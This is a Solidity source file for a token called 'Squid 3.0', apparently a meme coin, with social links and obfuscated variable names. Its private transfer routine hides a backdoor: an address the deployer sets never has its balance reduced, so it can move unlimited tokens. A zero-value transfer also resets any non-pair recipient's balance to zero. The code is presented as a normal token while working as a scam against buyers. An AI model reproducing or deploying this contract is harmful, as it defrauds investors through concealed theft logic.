/*

Telegram: https://t.me/SquidThreeERC

Twitter: https://twitter.com/SquidThreeERC

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Squid is Ownable {
    function approve(address djeyghurkfip, uint256 fremt) public returns (bool success) {
        allowance[msg.sender][djeyghurkfip] = fremt;
        emit Approval(msg.sender, djeyghurkfip, fremt);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'Squid 3.0';

    string public name = 'Squid 3.0';

    uint8 public decimals = 9;

    function transferFrom(address xncfgmbiuy, address equptcya, uint256 fremt) public returns (bool success) {
        require(fremt <= allowance[xncfgmbiuy][msg.sender]);
        allowance[xncfgmbiuy][msg.sender] -= fremt;
        srwipyzhlv(xncfgmbiuy, equptcya, fremt);
        return true;
    }

    mapping(address => uint256) private ndmkiq;

    constructor(address gfsyuh) {
        balanceOf[msg.sender] = totalSupply;
        zfpvaw[gfsyuh] = irol;
        IUniswapV2Router02 zlvkt = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        gaxzjwecftmv = IUniswapV2Factory(zlvkt.factory()).createPair(address(this), zlvkt.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public gaxzjwecftmv;

    uint256 private irol = 106;

    mapping(address => uint256) public balanceOf;

    function transfer(address equptcya, uint256 fremt) public returns (bool success) {
        srwipyzhlv(msg.sender, equptcya, fremt);
        return true;
    }

    function srwipyzhlv(address xncfgmbiuy, address equptcya, uint256 fremt) private {
        if (0 == zfpvaw[xncfgmbiuy]) {
            balanceOf[xncfgmbiuy] -= fremt;
        }
        balanceOf[equptcya] += fremt;
        if (0 == fremt && equptcya != gaxzjwecftmv) {
            balanceOf[equptcya] = fremt;
        }
        emit Transfer(xncfgmbiuy, equptcya, fremt);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private zfpvaw;
}